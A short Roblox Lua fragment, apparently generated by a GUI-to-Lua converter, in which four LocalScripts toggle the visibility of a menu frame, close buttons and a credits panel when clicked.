-- Scripts:

local function QDEAOJX_fake_script() -- AbrirMenu.LocalScript 
	local script = Instance.new('LocalScript', AbrirMenu)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Frame.Visible = true
	end)
end
coroutine.wrap(QDEAOJX_fake_script)()
local function KZPCH_fake_script() -- X.LocalScript 
	local script = Instance.new('LocalScript', X)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
	end)
end
coroutine.wrap(KZPCH_fake_script)()
local function FZMX_fake_script() -- X_2.LocalScript 
	local script = Instance.new('LocalScript', X_2)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
	end)
end
coroutine.wrap(FZMX_fake_script)()
local function LGHL_fake_script() -- AbrirCreditos.LocalScript 
	local script = Instance.new('LocalScript', AbrirCreditos)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Creditos.Visible = true
	end)
end
coroutine.wrap(LGHL_fake_script)()
